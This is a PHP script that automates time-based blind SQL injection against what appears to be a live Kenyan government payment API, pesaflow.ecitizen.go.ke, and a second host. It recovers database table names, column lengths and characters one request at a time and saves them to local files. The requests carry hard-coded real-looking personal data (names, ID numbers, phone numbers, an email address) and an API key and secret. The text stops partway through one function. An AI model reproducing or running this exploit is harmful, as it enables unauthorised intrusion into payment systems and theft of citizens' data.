<?php
session_start();
ini_set('max_execution_time', 0); // Set the execution time limit to infinite
include './includes/security.php';
$curl = curl_init();
$tableData = [
    ['position' => '1', 'name' => 'accounts', 'length' => '26'],
    ['position' => '10', 'name' => 'bankaccounts', 'length' => '5'],
    ['position' => '11', 'name' => 'banks', 'length' => '3'],
    ['position' => '12', 'name' => 'bank_bins', 'length' => '5'],
    ['position' => '13', 'name' => 'batchSettlements', 'length' => '13'],
    ['position' => '14', 'name' => 'bills', 'length' => '30'],
    ['position' => '15', 'name' => 'bills_backup', 'length' => '30'],
    ['position' => '16', 'name' => 'bills_daily_stats', 'length' => '30'],
    ['position' => '17', 'name' => 'bills_warehouse', 'length' => '30'],
    ['position' => '18', 'name' => 'billtokens', 'length' => '3'],
    ['position' => '19', 'name' => 'bin_service_mapping', 'length' => '6'],
    ['position' => '2', 'name' => 'accounttypes', 'length' => '3'],
    ['position' => '20', 'name' => 'bulkDisbursementDetails', 'length' => '14'],
    ['position' => '21', 'name' => 'bulkDisbursements', 'length' => '9'],
    ['position' => '22', 'name' => 'card_velocity_logs', 'length' => '12'],
    ['position' => '23', 'name' => 'clients', 'length' => '8'],
    ['position' => '24', 'name' => 'counties', 'length' => '2'],
    ['position' => '25', 'name' => 'countries', 'length' => '3'],
    ['position' => '26', 'name' => 'dashboardstats', 'length' => '10'],
    ['position' => '27', 'name' => 'dci_ids', 'length' => '3'],
    ['position' => '28', 'name' => 'disbursementTypes', 'length' => '4'],
    ['position' => '29', 'name' => 'forgotPasswordTokens', 'length' => '5'],
    ['position' => '3', 'name' => 'agents', 'length' => '6'],
    ['position' => '30', 'name' => 'ipn', 'length' => '10'],
    ['position' => '31', 'name' => 'masterAccounts', 'length' => '7'],
    ['position' => '32', 'name' => 'masterAccountTransactions', 'length' => '8'],
    ['position' => '33', 'name' => 'merchantCurrentDayStats', 'length' => '10'],
    ['position' => '34', 'name' => 'merchantDailyS', 'length' => '0'],
    ['position' => '35', 'name' => 'merchantDailyStatsClean', 'length' => '11'],
    ['position' => '36', 'name' => 'merchantDailyStatsUpdate', 'length' => '12'],
    ['position' => '37', 'name' => 'merchantDashStats', 'length' => '10'],
    ['position' => '38', 'name' => 'merchantHourlyStats', 'length' => '8'],
    ['position' => '39', 'name' => 'merchants', 'length' => '7'],
    ['position' => '4', 'name' => 'appmoduleactionmappings', 'length' => '4'],
    ['position' => '40', 'name' => 'merchantStats', 'length' => '8'],
    ['position' => '41', 'name' => 'merchantWeeklyStats', 'length' => '8'],
    ['position' => '42', 'name' => 'paymentGateways', 'length' => '7'],
    ['position' => '43', 'name' => 'paymentlogs', 'length' => '23'],
    ['position' => '44', 'name' => 'paymentlogs_old', 'length' => '15'],
    ['position' => '45', 'name' => 'paymentstatecodes', 'length' => '3'],
    ['position' => '46', 'name' => 'permissions', 'length' => '6'],
    ['position' => '47', 'name' => 'profiles', 'length' => '7'],
    ['position' => '48', 'name' => 'profiletypes', 'length' => '4'],
    ['position' => '49', 'name' => 'reasons', 'length' => '3'],
    ['position' => '5', 'name' => 'appmoduleactions', 'length' => '5'],
    ['position' => '50', 'name' => 'revenue', 'length' => '17'],
    ['position' => '51', 'name' => 'servicebankaccountmapping', 'length' => '3'],
    ['position' => '52', 'name' => 'serviceGatewayMapping', 'length' => '5'],
    ['position' => '53', 'name' => 'services', 'length' => '13'],
    ['position' => '54', 'name' => 'settlement', 'length' => '22'],
    ['position' => '55', 'name' => 'settlement2', 'length' => '21'],
    ['position' => '56', 'name' => 'settlementIssues', 'length' => '4'],
    ['position' => '57', 'name' => 'status', 'length' => '3'],
    ['position' => '58', 'name' => 'stk_transactions', 'length' => '13'],
    ['position' => '59', 'name' => 'tiers', 'length' => '6'],
    ['position' => '6', 'name' => 'appmodules', 'length' => '7'],
    ['position' => '60', 'name' => 'tokens', 'length' => '5'],
    ['position' => '61', 'name' => 'transactions', 'length' => '12'],
    ['position' => '62', 'name' => 'transaction_logs', 'length' => '11'],
    ['position' => '63', 'name' => 'transfers', 'length' => '18'],
    ['position' => '64', 'name' => 'uimodules', 'length' => '2'],
    ['position' => '65', 'name' => 'uipermissions', 'length' => '3'],
    ['position' => '66', 'name' => 'usergroups', 'length' => '5'],
    ['position' => '67', 'name' => 'usergroupsmapping', 'length' => '8'],
    ['position' => '68', 'name' => 'userMerchantMapping', 'length' => '7'],
    ['position' => '69', 'name' => 'userPaymentGateways', 'length' => '7'],
    ['position' => '7', 'name' => 'apppermissions', 'length' => '3'],
    ['position' => '70', 'name' => 'users', 'length' => '32'],
    ['position' => '71', 'name' => 'usertokens', 'length' => '5'],
    ['position' => '72', 'name' => 'vwannualwallettrx', 'length' => '5'],
    ['position' => '73', 'name' => 'vwmonthlywallettrx', 'length' => '6'],
    ['position' => '74', 'name' => 'vwtodaywallettrx', 'length' => '4'],
    ['position' => '75', 'name' => 'vwweeklywallettrx', 'length' => '7'],
    ['position' => '76', 'name' => 'vw_agenttotal', 'length' => '5'],
    ['position' => '77', 'name' => 'vw_annualservicestats', 'length' => '6'],
    ['position' => '78', 'name' => 'vw_cashbook', 'length' => '12'],
    ['position' => '79', 'name' => 'vw_dailymerchantstats', 'length' => '5'],
    ['position' => '8', 'name' => 'audittrail', 'length' => '16'],
    ['position' => '80', 'name' => 'vw_dailyservicestats', 'length' => '8'],
    ['position' => '81', 'name' => 'vw_dailystats', 'length' => '7'],
    ['position' => '82', 'name' => 'vw_merchant', 'length' => '6'],
    ['position' => '83', 'name' => 'vw_merchantservices', 'length' => '15'],
    ['position' => '84', 'name' => 'vw_merchantservices_new', 'length' => '6'],
    ['position' => '85', 'name' => 'vw_monthlymerchantsstats', 'length' => '5'],
    ['position' => '86', 'name' => 'vw_monthlyservicestats', 'length' => '7'],
    ['position' => '87', 'name' => 'vw_monthlystats', 'length' => '6'],
    ['position' => '88', 'name' => 'vw_permissions', 'length' => '11'],
    ['position' => '89', 'name' => 'vw_revenuepergateway', 'length' => '10'],
    ['position' => '9', 'name' => 'audittraildetails', 'length' => '6'],
    ['position' => '90', 'name' => 'vw_settlementPerGateway', 'length' => '7'],
    ['position' => '91', 'name' => 'vw_todayservicestats', 'length' => '7'],
    ['position' => '92', 'name' => 'vw_weeklyservicestats', 'length' => '8'],
    ['position' => '93', 'name' => 'vw_yearmerchantstats', 'length' => '5'],
    ['position' => '94', 'name' => 'vw_yearstats', 'length' => '5'],
    ['position' => '95', 'name' => 'withdrawals', 'length' => '8']
];

if (file_exists("./tablesData.json")) {
    $path = "./";
} elseif (file_exists("../tablesData.json")) {
    $path = "../";
} elseif (file_exists("../../tablesData.json")) {
    $path = "../../";
}
$tableDataMod = json_decode(file_get_contents($path . 'tablesData.json'), true);

function httpGet($url, $data, $headers = null, $cookie_jar = null)
{
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        $sessionCookie = $_COOKIE['PHPSESSID'];
        curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $sessionCookie);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);
        if ($headers != null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }

        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}

function randCode($length = 10)
{
    // $length = 10; // desired length of the random string
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString;
}
function areAllItemsEqual($array)
{
    if (count($array) <= 1) {
        return true;
    }

    $firstItem = $array[0];

    foreach ($array as $item) {
        if ($item !== $firstItem) {
            return false;
        }
    }

    return true;
}
function evaluateArray($array)
{
    $count = count($array);

    if ($count == 2) {
        return $array[0] === $array[1];
    }

    if ($count > 2) {
        $frequency = array_count_values($array);
        $mostCommon = array_search(max($frequency), $frequency);

        if (count($frequency) == $count) {
            return false; // All items are unique
        }

        return $mostCommon;
    }

    return null; // Invalid input
}
function build_file($file, $data)
{

    $file_data = fopen($file, "w");

    fwrite($file_data, $data);

    fclose($file_data);
}
function convertDecimalToCharacter($decimal)
{
    if ($decimal >= 0 && $decimal <= 255) {
        return chr($decimal);
    } else {
        return false; // Invalid ASCII decimal
    }
}

function sql_verif($statecode, $stateobject)
{
    //$responseQuery = json_decode(base64_decode($_GET['query']), true);

    //$processQuery = json_decode(base64_decode($_GET['q']), true);
    $stateCodeQuery = json_decode(base64_decode($statecode), true);
    $stateObjectQuery = json_decode(base64_decode($stateobject), true);

    $stateObjectQuery_query = json_decode(base64_decode($stateObjectQuery['query']), true);

    $responseQuery = $stateObjectQuery_query;

    //*
    $stateObjectQuery['statecode'] = $statecode;

    $charposp = $responseQuery['charpos'];
    $paramp = $responseQuery['param'];
    $targetp = $responseQuery['target'];
    $sleepp = $responseQuery['sleep'];

    if (count($stateCodeQuery) < 2) {
        if ($stateObjectQuery['f'] == 'L') {
            echo length_finder($sleepp, $targetp, $paramp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
        } elseif ($stateObjectQuery['f'] == 'C') {
            echo character_finder($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
        } else {
            if ($stateObjectQuery['message'] == 1) {
                echo character_finder($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
            } elseif ($stateObjectQuery['message'] == 2) {
                echo character_finder2($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
            } elseif ($stateObjectQuery['message'] == 3) {
                echo character_finder_punctuation($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
            } elseif ($stateObjectQuery['message'] == 5) {
                echo character_finder_special($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
            }
        }
    } else {
        $eval = evaluateArray($stateCodeQuery);

        if ($eval == false) {
            if ($stateObjectQuery['f'] == 'L') {
                echo length_finder($sleepp, $targetp, $paramp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
            } elseif ($stateObjectQuery['f'] == 'C') {
                echo character_finder($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
            } else {
                if ($stateObjectQuery['message'] == 1) {
                    echo character_finder($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
                } elseif ($stateObjectQuery['message'] == 2) {
                    echo character_finder2($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
                } elseif ($stateObjectQuery['message'] == 3) {
                    echo character_finder_punctuation($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
                } elseif ($stateObjectQuery['message'] == 5) {
                    echo character_finder_special($charposp, $paramp, $targetp, $sleepp, $stateObjectQuery) . '<BR/>' . PHP_EOL;
                }
            }
        } else {
            if ($eval == true) {
                $result = $stateCodeQuery[0];
            } else {
                $result = $eval;
            }
            //*
            if ($stateObjectQuery['f'] == 'CF') {
                $result = convertDecimalToCharacter($result);
                if (isset($stateObjectQuery['pr'])) {
                    $pr1 = base64_decode($stateObjectQuery['pr']);
                    $pr2 = $pr1 .  $result;
                    $progress = base64_encode($pr2);
                } else {
                    $progress = base64_encode($result);
                }
            } else {
                if (isset($stateObjectQuery['pr'])) {
                    $pr1 = base64_decode($stateObjectQuery['pr']);
                    $pr2 = $pr1 . '-' . $result;
                    $progress = base64_encode($pr2);
                } else {
                    $progress = base64_encode($result);
                }
            }

            //*/
            if ($stateObjectQuery['f'] == 'L') {
                $file = './pftb/tableColumns.json';
                if (!file_exists($file)) {
                    $file_data = [$stateObjectQuery['tb'] => [$stateObjectQuery['cl'] => $result]];
                } else {
                    $file_data = json_decode(file_get_contents($file), true);
                    $file_data[$stateObjectQuery['tb']][$stateObjectQuery['cl']] = $result;
                }
                $file_json = json_encode($file_data);
                build_file($file, $file_json);
                if ($stateObjectQuery['cl'] == $stateObjectQuery['ttcm']) {
                    if (isset($stateObjectQuery['pr'])) {
                        $pr1 = base64_decode($stateObjectQuery['pr']);
                        $pr2 = $pr1 . '-' . $result;
                        $progress = base64_encode($pr2);
                    } else {
                        $progress = base64_encode($result);
                    }
                    sql_result($progress);
                } else {
                    $stateObjectQuery['cl'] = $stateObjectQuery['cl'] + 1;
                    $continueObj = base64_encode(json_encode($stateObjectQuery));
                    sql_cont($continueObj, $progress);
                }
            } elseif ($stateObjectQuery['f'] == 'C') {
                $file = './pftb/data/' . $stateObjectQuery['tb'] . '_ColumnNames.json';
                if (!file_exists($file)) {
                    $file_data = [$stateObjectQuery['tb'] => [$stateObjectQuery['cl'] => [$charposp => $result]]];
                } else {
                    $file_data = json_decode(file_get_contents($file), true);
                    $file_data[$stateObjectQuery['tb']][$stateObjectQuery['cl']][$charposp] = $result;
                }
                $file_json = json_encode($file_data);
                build_file($file, $file_json);
                if ($stateObjectQuery['charpos'] == $stateObjectQuery['lngth']) {
                    if (isset($stateObjectQuery['pr'])) {
                        $pr1 = base64_decode($stateObjectQuery['pr']);
                        $pr2 = $pr1 . '-' . $result;
                        $progress = base64_encode($pr2);
                    } else {
                        $progress = base64_encode($result);
                    }
                    sql_result($progress);
                } else {
                    $stateObjectQuery['charpos'] = $stateObjectQuery['charpos'] + 1;
                    $continueObj = base64_encode(json_encode($stateObjectQuery));
                    sql_cont($continueObj, $progress);
                }
            } else {
                $result = convertDecimalToCharacter($result);
                // || $stateObjectQuery['ttcm'] == ($stateObjectQuery['charpos']-1)
                if ($stateObjectQuery['charpos'] == $stateObjectQuery['lngth']) {

                    sql_result($progress);
                } else {
                    $stateObjectQuery['ttcm'] = $stateObjectQuery['ttcm'] + 1;
                    $stateObjectQuery['charpos'] = $stateObjectQuery['charpos'] + 1;
                    $continueObj = base64_encode(json_encode($stateObjectQuery));
                    sql_cont($continueObj, $progress);
                }
            }
        }
    }
}
function sql_result($result)
{
    $date1 = date('H:i:s');
    $progress = base64_decode($result);
    echo '<br/><br/><br/>' . PHP_EOL . PHP_EOL . $progress . PHP_EOL . '<BR/>' . PHP_EOL;
    echo $date1 . '<BR/>' . PHP_EOL;
    exit('Quering done!') . '<BR/>' . PHP_EOL;
}

function sql_cont($cont, $pr)
{
    global $tableDataMod;
    $date1 = date('H:i:s');
    $stateObjectQuery = json_decode(base64_decode($cont), true);

    $stateObjectQuery_query = json_decode(base64_decode($stateObjectQuery['query']), true);

    $responseQuery = $stateObjectQuery_query;

    ///////////////////////////////////////////////////////////////////////////
    $func = $stateObjectQuery['f'];
    $table = $stateObjectQuery['tb'];
    $column = $stateObjectQuery['cl'];
    $length = $stateObjectQuery['lngth'];

    $tbColumnsTotal = $stateObjectQuery['ttcm'];

    $i = $stateObjectQuery['message'];
    $finderp = $stateObjectQuery['message'];
    $qid = $stateObjectQuery['id'];
    $qpg = $stateObjectQuery['page'];
    $qmsg = $stateObjectQuery['message'];
    $target = $responseQuery['target'];
    $sleepp = $responseQuery['sleep'];
    $charposp = $stateObjectQuery['charpos'];
    $paramp = $responseQuery['param'];
    //*/


    if ($target == '1') {
        $db_name = 'pesaflow';
        $targetp = 1;
    } else {
        $db_name = 'tsavosit_collo';
        $targetp = 2;
    }


    //$paramp = "(SELECT(COLUMN_NAME)FROM(information_schema.columns)WHERE(table_schema='" . $db_name . "'AND(table_name='" . $tb_name . "'))ORDER%20BY(COLUMN_NAME)LIMIT%201%20OFFSET%20" . $tb_column . ")";


    $qq1 = [
        'charpos' => $charposp,
        'param' => $paramp,
        'target' => $targetp,
        'sleep' => $sleepp,
        's_time' => $date1
    ];
    $qq2 = base64_encode(json_encode($qq1));


    $state = [
        'id' => $qid,
        'page' => $qpg,
        'message' => $qmsg,
        'tb' => $table,
        'cl' => $column,
        'lngth' => $length,
        'charpos' => $charposp,
        'ttcm' => $tbColumnsTotal, //loop moderator & controller
        'f' => $func,
        'pr' => $pr,
        'query' => $qq2
    ];
    echo json_encode($state);
    //*
    if ($func == 'L') {
        echo length_finder($sleepp, $targetp, $paramp, $state) . '<BR/>' . PHP_EOL;
    } elseif ($func == 'C') {
        echo character_finder($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>' . PHP_EOL;
    } else {
        if ($finderp == 1) {
            echo character_finder($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>' . PHP_EOL;
        } elseif ($finderp == 2) {
            echo character_finder2($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>' . PHP_EOL;
        } elseif ($finderp == 3) {
            echo character_finder_punctuation($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>' . PHP_EOL;
        } elseif ($finderp == 5) {
            echo character_finder_special($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>' . PHP_EOL;
        }
    }
    //*/
}
function pesaflow_b($injection, $i, $sleep_timer, $state)
{
    $injection = str_replace(' ', '%20', $injection);
    $sleep_a = $sleep_timer + 1;
    $sleep_b = $sleep_a * 1000;
    // $curl = curl_init();
    global $curl;
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://pesaflow.ecitizen.go.ke/PaymentAPI/iframev2.1.php',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
        CURLOPT_HTTPHEADER => array(
            'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'DNT: 1',
            'Upgrade-Insecure-Requests: 1',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Dest: iframe',
            'host: pesaflow.ecitizen.go.ke'
        ),
    ));

    // Set the cURL timeout
    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);

    // Execute the cURL request
    $response = curl_exec($curl);

    // Check for cURL errors and the execution time
    $curlError = curl_error($curl);
    $curlInfo = curl_getinfo($curl);

    // Close the cURL session
    curl_close($curl);

    $i = [
        'message' => $i,
    ];
    // Check if the request timed out
    if ($curlInfo['total_time'] >= 5) {
        if ($state['id'] == 1) {
            echo "result:" . $i['message'];
            exit; // Terminate the script
        } elseif ($state['id'] == 2) {
            if (is_array($i)) {

                $stateObject = base64_encode(json_encode($state));

                if (!isset($state['statecode'])) {
                    $stateCode = base64_encode(json_encode([$i['message']]));
                } else {
                    $stc_a = json_decode(base64_decode($state['statecode']), true);
                    //$stc_a['statecode']
                    array_push($stc_a, $i['message']);
                    $stateCode = base64_encode(json_encode($stc_a));
                    //$state['stateCode'] = '';
                }
                sql_verif($stateCode, $stateObject);

                exit('The script touched exit!'); // Terminate the script
            } else {
                echo "Variable [i] should be an array with state 2!";
                exit; // Terminate the script
            }
        } else {
            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
            exit; // Terminate the script
        }
    } else {
        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
    }

    // Handle other possible errors or process the response as needed
    if ($curlError) {
        echo "cURL Error: " . $curlError;
        exit; // Terminate the script
    }

    // Process the response as needed
    // ...
}

function pesaflow($injection, $i, $sleep_timer, $state)
{
    $injection = str_replace(' ', '%20', $injection);
    $sleep_a = $sleep_timer + 1;
    $sleep_b = $sleep_a * 1000;
    // $curl = curl_init();
    global $curl;
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://pesaflow.ecitizen.go.ke/PaymentAPI/iframev2.1.php',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
        CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164'%2b" . $injection . "%2b'&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.phpp&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
        //CURLOPT_POSTFIELDS => "amountExpected=250.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR13%22)&billRefNumber=4MXRN9&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Fsuccess&clientEmail=Waroruaalex640%40gmail.com&clientIDNumber=39290974&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=ALEX%20WANG\'ANG\'A%20WARORUA&clientType=1&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=NzM0ODk3NWMwMDlhOTUyYTMxYmVmMDRiZDQ2ODc3Y2ZiZDg4YmJlMDBlMzMwZTcxZmRlZmMzNWRhZWJhNWYzMA%3D%3D&serviceID=39",

        CURLOPT_HTTPHEADER => array(
            'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'DNT: 1',
            'Upgrade-Insecure-Requests: 1',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Dest: iframe',
            'host: pesaflow.ecitizen.go.ke'
        ),
    ));

    // Set the cURL timeout
    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);

    // Execute the cURL request
    $response = curl_exec($curl);

    // Check for cURL errors and the execution time
    $curlError = curl_error($curl);
    $curlInfo = curl_getinfo($curl);
    //echo $response;
    // Close the cURL session
    curl_close($curl);

    $i = [
        'message' => $i,
    ];
    // Check if the request timed out
    if ($curlInfo['total_time'] >= 5) {
        if ($state['id'] == 1) {
            echo "result:" . $i['message'];
            exit; // Terminate the script
        } elseif ($state['id'] == 2) {
            if (is_array($i)) {

                $stateObject = base64_encode(json_encode($state));

                if (!isset($state['statecode'])) {
                    $stateCode = base64_encode(json_encode([$i['message']]));
                } else {
                    $stc_a = json_decode(base64_decode($state['statecode']), true);
                    //$stc_a['statecode']
                    array_push($stc_a, $i['message']);
                    $stateCode = base64_encode(json_encode($stc_a));
                    //$state['stateCode'] = '';
                }
                sql_verif($stateCode, $stateObject);

                exit('The script touched exit!'); // Terminate the script
            } else {
                echo "Variable [i] should be an array with state 2!";
                exit; // Terminate the script
            }
        } else {
            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
            exit; // Terminate the script
        }
    } else {
        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
    }

    // Handle other possible errors or process the response as needed
    if ($curlError) {
        echo "cURL Error: " . $curlError;
        exit; // Terminate the script
    }

    // Process the response as needed
    // ...
}

function kotnova($injection, $i, $sleep_timer, $state)
{
    $injection = str_replace(' ', '%20', $injection);
    $sleep_a = $sleep_timer + 1;
    $sleep_b = $sleep_a * 1000;
    // $curl = curl_init();
    global $curl;
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://kever.io/sqlb.php?local=1',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
